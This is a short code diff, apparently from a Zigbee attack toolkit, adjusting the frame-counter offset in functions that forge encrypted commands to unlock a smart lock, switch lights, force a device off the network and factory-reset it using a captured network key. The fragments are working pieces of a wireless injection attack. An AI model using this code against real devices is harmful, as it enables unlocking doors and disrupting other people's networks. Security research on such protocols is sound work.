@@ -250,7 +250,7 @@ def unlock_lock(radio, panid, addr, network_key, coord_addr=None, coord_extended
         print_error(
             "Could not find the required data to send the unlock request")
 
-    frame_counter_iter = SequenceIterator(frame_counter+22, 0xffffffff)
+    frame_counter_iter = SequenceIterator(frame_counter+1, 0xffffffff)
     sequence_number = random.randint(0, 255)
     nwk_sequence_number = random.randint(0, 255)
     aps_counter = random.randint(0, 255)
@@ -330,7 +330,7 @@ def light_toggle(radio, panid, addr, network_key, amount, coord_addr=None, coord
         print_error(
             "Could not find the required data to send the unlock request")
 
-    frame_counter_iter = SequenceIterator(frame_counter+22, 0xffffffff)
+    frame_counter_iter = SequenceIterator(frame_counter+1, 0xffffffff)
     for a in range(amount):
         sequence_number = random.randint(0, 255)
         nwk_sequence_number = random.randint(0, 255)
@@ -361,7 +361,7 @@ def light_off(radio, panid, addr, network_key, amount, coord_addr=None, coord_ex
         print_error(
             "Could not find the required data to send the turn off request")
 
-    frame_counter_iter = SequenceIterator(frame_counter+22, 0xffffffff)
+    frame_counter_iter = SequenceIterator(frame_counter+1, 0xffffffff)
     for a in range(amount):
         sequence_number = random.randint(0, 255)
         nwk_sequence_number = random.randint(0, 255)
@@ -392,7 +392,7 @@ def light_on(radio, panid, addr, network_key, amount, coord_addr=None, coord_ext
         print_error(
             "Could not find the required data to send the turn on request")
 
-    frame_counter_iter = SequenceIterator(frame_counter+22, 0xffffffff)
+    frame_counter_iter = SequenceIterator(frame_counter+1, 0xffffffff)
 
     for a in range(amount):
         sequence_number = random.randint(0, 255)
@@ -424,7 +424,7 @@ def leave_req(radio, panid, addr, network_key, coord_addr=None, coord_extended_a
         print_error(
             "Could not find the required data to send the unlock request")
 
-    frame_counter_iter = SequenceIterator(frame_counter+22, 0xffffffff)
+    frame_counter_iter = SequenceIterator(frame_counter+1, 0xffffffff)
     sequence_number = random.randint(0, 255)
     nwk_sequence_number = random.randint(0, 255)
     aps_counter = random.randint(0, 255)
@@ -460,7 +460,7 @@ def factory_reset(radio, panid, addr, network_key, coord_addr=None, coord_extend
         print_error(
             "Could not find the required data to send the factory reset request")
 
-    frame_counter_iter = SequenceIterator(frame_counter+22, 0xffffffff)
+    frame_counter_iter = SequenceIterator(frame_counter+1, 0xffffffff)
     sequence_number = random.randint(0, 255)
     nwk_sequence_number = random.randint(0, 255)
     aps_counter = random.randint(0, 255)
